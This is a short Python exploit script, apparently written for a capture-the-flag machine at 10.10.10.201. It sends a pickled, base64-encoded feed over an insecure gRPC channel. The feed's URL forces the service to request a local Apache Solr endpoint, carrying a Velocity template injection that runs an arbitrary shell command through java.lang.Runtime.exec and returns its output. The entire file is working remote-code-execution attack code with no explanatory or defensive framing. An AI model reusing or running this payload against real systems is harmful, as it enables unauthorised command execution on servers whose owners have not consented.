
import grpc
import pickle
import service_pb2
import service_pb2_grpc
import base64
import sys
from func_timeout import func_set_timeout, FunctionTimedOut
from urllib.parse import quote

template = '{"version": "v1.0", "title": "PrinterFeed", "feed_url": "target"}'
channel = grpc.insecure_channel("10.10.10.201:9000")
stub = service_pb2_grpc.PrintStub(channel)




command = quote(sys.argv[1])
print(command)
payload = f"http://localhost:8983/solr/staging/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{command}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
feed = template.replace("target", payload)
serialized = base64.b64encode(pickle.dumps(feed))
data = stub.Feed(service_pb2.Contents(data=serialized))
print(feed)
print(data.feed)
